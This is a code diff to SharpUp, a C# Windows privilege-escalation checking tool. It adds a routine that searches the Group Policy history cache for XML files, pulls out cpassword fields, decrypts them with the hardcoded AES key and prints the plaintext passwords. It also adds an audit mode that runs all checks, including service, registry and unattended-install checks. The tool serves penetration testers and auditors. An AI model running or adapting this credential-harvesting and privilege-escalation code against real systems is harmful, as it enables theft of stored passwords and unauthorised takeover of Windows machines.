@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -16,7 +16,9 @@ using System.Security.Principal;
 using System.ServiceProcess;
 using System.Text;
 using System.Text.RegularExpressions;
+using System.Xml;
 using Microsoft.Win32;
+using System.Security.Cryptography;
 
 
 namespace SharpUp
@@ -413,22 +415,25 @@ namespace SharpUp
         public static List<string> FindFiles(string path, string patterns)
         {
             // finds files matching one or more patterns under a given path, recursive
-            //      pattern: "*pass*;*.png;"
             // adapted from http://csharphelper.com/blog/2015/06/find-files-that-match-multiple-patterns-in-c/
-
-            string[] pattern_array = patterns.Split(';');
+            //      pattern: "*pass*;*.png;"
 
             var files = new List<string>();
-            foreach (string pattern in pattern_array)
+
+            try
             {
-                try
+                // search every pattern in this directory's files
+                foreach (string pattern in patterns.Split(';'))
                 {
                     files.AddRange(Directory.GetFiles(path, pattern, SearchOption.TopDirectoryOnly));
-                    foreach (var directory in Directory.GetDirectories(path))
-                        files.AddRange(FindFiles(directory, pattern));
                 }
-                catch (UnauthorizedAccessException) { }
+
+                // go recurse in all sub-directories
+                foreach (var directory in Directory.GetDirectories(path))
+                    files.AddRange(FindFiles(directory, patterns));
             }
+            catch (UnauthorizedAccessException) { }
+            catch (PathTooLongException) { }
 
             return files;
         }
@@ -689,21 +694,20 @@ namespace SharpUp
             {
                 Console.WriteLine("\r\n\r\n=== Unattended Install Files ===\r\n");
 
-                string drive = System.Environment.GetEnvironmentVariable("SystemDrive");
-
+                string windir = System.Environment.GetEnvironmentVariable("windir");
                 string[] SearchLocations =
                 {
-                    String.Format("{0}\\sysprep\\sysprep.xml", drive),
-                    String.Format("{0}\\sysprep\\sysprep.inf", drive),
-                    String.Format("{0}\\sysprep.inf", drive),
-                    String.Format("{0}\\Panther\\Unattended.xml", drive),
-                    String.Format("{0}\\Panther\\Unattend.xml", drive),
-                    String.Format("{0}\\Panther\\Unattend\\Unattend.xml", drive),
-                    String.Format("{0}\\Panther\\Unattend\\Unattended.xml", drive),
-                    String.Format("{0}\\System32\\Sysprep\\unattend.xml", drive),
-                    String.Format("{0}\\System32\\Sysprep\\Panther\\unattend.xml", drive)
+                    String.Format("{0}\\sysprep\\sysprep.xml", windir),
+                    String.Format("{0}\\sysprep\\sysprep.inf", windir),
+                    String.Format("{0}\\sysprep.inf", windir),
+                    String.Format("{0}\\Panther\\Unattended.xml", windir),
+                    String.Format("{0}\\Panther\\Unattend.xml", windir),
+                    String.Format("{0}\\Panther\\Unattend\\Unattend.xml", windir),
+                    String.Format("{0}\\Panther\\Unattend\\Unattended.xml", windir),
+                    String.Format("{0}\\System32\\Sysprep\\unattend.xml", windir),
+                    String.Format("{0}\\System32\\Sysprep\\Panther\\unattend.xml", windir)
                 };
-
+                
                 foreach (string SearchLocation in SearchLocations)
                 {
                     if (System.IO.File.Exists(SearchLocation))
@@ -750,42 +754,327 @@ namespace SharpUp
             }
         }
 
-        public static void PrivescChecks()
+      
+        public static void GetCachedGPPPassword()
+        {
+            try
+            {
+                Console.WriteLine("\r\n\r\n=== Cached GPP Password ===\r\n");
+
+                string allUsers = System.Environment.GetEnvironmentVariable("ALLUSERSPROFILE");
+
+                if (!allUsers.Contains("ProgramData"))
+                {
+                    // Before Windows Vista, the default value of AllUsersProfile was "C:\Documents and Settings\All Users"
+                    // And after, "C:\ProgramData"
+                    allUsers += "\\Application Data";
+                }
+                allUsers += "\\Microsoft\\Group Policy\\History"; // look only in the GPO cache folder
+
+                List<String> files = FindFiles(allUsers, "*.xml");
+
+                // files will contain all XML files
+                foreach (string file in files)
+                {
+                    if (!(file.Contains("Groups.xml") || file.Contains("Services.xml")
+                        || file.Contains("Scheduledtasks.xml") || file.Contains("DataSources.xml")
+                        || file.Contains("Printers.xml") || file.Contains("Drives.xml")))
+                    {
+                        continue; // uninteresting XML files, move to next
+                    }
+
+                    XmlDocument xmlDoc = new XmlDocument();
+                    xmlDoc.Load(file);
+
+                    if (!xmlDoc.InnerXml.Contains("cpassword"))
+                    {
+                        continue; // no "cpassword" => no interesting content, move to next
+                    }
+
+                    Console.WriteLine("\r\n{0}", file);
+
+                    string cPassword = "";
+                    string UserName = "";
+                    string NewName = "";
+                    string Changed = "";
+                    if (file.Contains("Groups.xml"))
+                    {
+                        XmlNode a = xmlDoc.SelectSingleNode("/Groups/User/Properties");
+                        XmlNode b = xmlDoc.SelectSingleNode("/Groups/User");
+                        foreach (XmlAttribute attr in a.Attributes)
+                        {
+                            if (attr.Name.Equals("cpassword"))
+                            {
+                                cPassword = attr.Value;
+                            }
+                            if (attr.Name.Equals("userName"))
+                            {
+                                UserName = attr.Value;
+                            }
+                            if (attr.Name.Equals("newName"))
+                            {
+                                NewName = attr.Value;
+                            }
+                        }
+                        foreach (XmlAttribute attr in b.Attributes)
+                        {
+                            if (attr.Name.Equals("changed"))
+                            {
+                                Changed = attr.Value;
+                            }
+                        }
+                        //Console.WriteLine("\r\nA{0}", a.Attributes[0].Value);
+                    }
+                    else if (file.Contains("Services.xml"))
+                    {
+                        XmlNode a = xmlDoc.SelectSingleNode("/NTServices/NTService/Properties");
+                        XmlNode b = xmlDoc.SelectSingleNode("/NTServices/NTService");
+                        foreach (XmlAttribute attr in a.Attributes)
+                        {
+                            if (attr.Name.Equals("cpassword"))
+                            {
+                                cPassword = attr.Value;
+                            }
+                            if (attr.Name.Equals("accountName"))
+                            {
+                                UserName = attr.Value;
+                            }
+                        }
+                        foreach (XmlAttribute attr in b.Attributes)
+                        {
+                            if (attr.Name.Equals("changed"))
+                            {
+                                Changed = attr.Value;
+                            }
+                        }
+
+                    }
+                    else if (file.Contains("Scheduledtasks.xml"))
+                    {
+                        XmlNode a = xmlDoc.SelectSingleNode("/ScheduledTasks/Task/Properties");
+                        XmlNode b = xmlDoc.SelectSingleNode("/ScheduledTasks/Task");
+                        foreach (XmlAttribute attr in a.Attributes)
+                        {
+                            if (attr.Name.Equals("cpassword"))
+                            {
+                                cPassword = attr.Value;
+                            }
+                            if (attr.Name.Equals("runAs"))
+                            {
+                                UserName = attr.Value;
+                            }
+                        }
+                        foreach (XmlAttribute attr in b.Attributes)
+                        {
+                            if (attr.Name.Equals("changed"))
+                            {
+                                Changed = attr.Value;
+                            }
+                        }
+
+                    }
+                    else if (file.Contains("DataSources.xml"))
+                    {
+                        XmlNode a = xmlDoc.SelectSingleNode("/DataSources/DataSource/Properties");
+                        XmlNode b = xmlDoc.SelectSingleNode("/DataSources/DataSource");
+                        foreach (XmlAttribute attr in a.Attributes)
+                        {
+                            if (attr.Name.Equals("cpassword"))
+                            {
+                                cPassword = attr.Value;
+                            }
+                            if (attr.Name.Equals("username"))
+                            {
+                                UserName = attr.Value;
+                            }
+                        }
+                        foreach (XmlAttribute attr in b.Attributes)
+                        {
+                            if (attr.Name.Equals("changed"))
+                            {
+                                Changed = attr.Value;
+                            }
+                        }
+                    }
+                    else if (file.Contains("Printers.xml"))
+                    {
+                        XmlNode a = xmlDoc.SelectSingleNode("/Printers/SharedPrinter/Properties");
+                        XmlNode b = xmlDoc.SelectSingleNode("/Printers/SharedPrinter");
+                        foreach (XmlAttribute attr in a.Attributes)
+                        {
+                            if (attr.Name.Equals("cpassword"))
+                            {
+                                cPassword = attr.Value;
+                            }
+                            if (attr.Name.Equals("username"))
+                            {
+                                UserName = attr.Value;
+                            }
+                        }
+                        foreach (XmlAttribute attr in b.Attributes)
+                        {
+                            if (attr.Name.Equals("changed"))
+                            {
+                                Changed = attr.Value;
+                            }
+                        }
+                    }
+                    else
+                    {
+                        // Drives.xml
+                        XmlNode a = xmlDoc.SelectSingleNode("/Drives/Drive/Properties");
+                        XmlNode b = xmlDoc.SelectSingleNode("/Drives/Drive");
+                        foreach (XmlAttribute attr in a.Attributes)
+                        {
+                            if (attr.Name.Equals("cpassword"))
+                            {
+                                cPassword = attr.Value;
+                            }
+                            if (attr.Name.Equals("username"))
+                            {
+                                UserName = attr.Value;
+                            }
+                        }
+                        foreach (XmlAttribute attr in b.Attributes)
+                        {
+                            if (attr.Name.Equals("changed"))
+                            {
+                                Changed = attr.Value;
+                            }
+                        }
+
+                    }
+
+                    if (UserName.Equals(""))
+                    {
+                        UserName = "[BLANK]";
+                    }
+
+                    if (NewName.Equals(""))
+                    {
+                        NewName = "[BLANK]";
+                    }
+
+
+                    if (cPassword.Equals(""))
+                    {
+                        cPassword = "[BLANK]";
+                    }
+                    else
+                    {
+                        cPassword = DecryptGPP(cPassword);
+                    }
+
+                    if (Changed.Equals(""))
+                    {
+                        Changed = "[BLANK]";
+                    }
+
+
+                    Console.WriteLine("UserName: {0}", UserName);
+                    Console.WriteLine("NewName: {0}", NewName);
+                    Console.WriteLine("cPassword: {0}", cPassword);
+                    Console.WriteLine("Changed: {0}", Changed);
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(String.Format("  [X] Exception: {0}", ex.Message));
+            }
+        }
+
+
+        public static string DecryptGPP(string cpassword)
+        {
+            int mod = cpassword.Length % 4;
+
+            switch (mod)
+            {
+                case 1:
+                    cpassword = cpassword.Substring(0, cpassword.Length - 1);
+                    break;
+                case 2:
+                    cpassword += "".PadLeft(4 - mod, '=');
+                    break;
+                case 3:
+                    cpassword += "".PadLeft(4 - mod, '=');
+                    break;
+                default:
+                    break;
+            }
+            
+            byte[] base64decoded = Convert.FromBase64String(cpassword);
+            
+            AesCryptoServiceProvider aesObject = new AesCryptoServiceProvider();
+            
+            byte[] aesKey = { 0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8, 0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90, 0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b };
+            byte[] aesIV = new byte[aesObject.IV.Length];
+
+            aesObject.IV = aesIV;
+            aesObject.Key = aesKey;
+
+            ICryptoTransform aesDecryptor = aesObject.CreateDecryptor();
+            byte[] outBlock = aesDecryptor.TransformFinalBlock(base64decoded, 0, base64decoded.Length);
+
+            return System.Text.UnicodeEncoding.Unicode.GetString(outBlock);
+        }
+
+        public static void PrivescChecks(bool auditMode)
         {
             bool isHighIntegrity = IsHighIntegrity();
             bool isLocalAdmin = IsLocalAdmin();
+            bool shouldQuit = false;
 
-            if (IsHighIntegrity())
+            if (isHighIntegrity)
             {
                 Console.WriteLine("\r\n[*] Already in high integrity, no need to privesc!");
+                shouldQuit = true;
             }
             else if (!isHighIntegrity && isLocalAdmin)
             {
                 Console.WriteLine("\r\n[*] In medium integrity but user is a local administrator- UAC can be bypassed.");
+                shouldQuit = true;
             }
-            else
+
+            // if already admin we can quit without running all checks
+            if (shouldQuit)
             {
-                GetModifiableServices();
-                GetModifiableServiceBinaries();
-                GetAlwaysInstallElevated();
-                GetPathHijacks();
-                GetModifiableRegistryAutoRuns();
-                GetSpecialTokenGroupPrivs();
-                GetUnattendedInstallFiles();
-                GetMcAfeeSitelistFiles();
+                if (!auditMode)
+                {
+                    Console.WriteLine("\r\n[*] Quitting now, re-run with \"audit\" argument to run all checks anyway (audit mode).");
+                    return;
+                }
+                else
+                {
+                    // except if auditMode has explictly been asked
+                    Console.WriteLine("\r\n[*] Audit mode: running all checks anyway.");
+                }
             }
+
+            GetModifiableServices();
+            GetModifiableServiceBinaries();
+            GetAlwaysInstallElevated();
+            GetPathHijacks();
+            GetModifiableRegistryAutoRuns();
+            GetSpecialTokenGroupPrivs();
+            GetUnattendedInstallFiles();
+            GetMcAfeeSitelistFiles();
+            GetCachedGPPPassword();
         }
 
         static void Main(string[] args)
         {
+            bool auditMode = args.Contains("audit", StringComparer.CurrentCultureIgnoreCase);
+
             var watch = System.Diagnostics.Stopwatch.StartNew();
 
             Console.WriteLine("\r\n=== SharpUp: Running Privilege Escalation Checks ===");
 
-            PrivescChecks();
+            PrivescChecks(auditMode);
 
             watch.Stop();
             Console.WriteLine(String.Format("\r\n\r\n[*] Completed Privesc Checks in {0} seconds\r\n", watch.ElapsedMilliseconds / 1000));
         }
     }
 }
+
